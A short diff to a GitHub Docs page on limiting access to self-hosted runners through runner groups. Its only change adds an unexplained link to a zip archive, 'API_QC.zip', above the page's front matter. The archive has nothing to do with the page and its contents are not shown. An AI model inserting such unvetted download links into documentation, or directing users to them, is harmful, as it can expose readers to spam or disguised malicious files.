@@ -1,3 +1,4 @@
+[API_QC.zip](https://github.com/github/docs/files/8501216/API_QC.zip)
 ---
 title: Managing access to self-hosted runners using groups
 intro: You can use policies to limit access to self-hosted runners that have been added to an organization or enterprise.
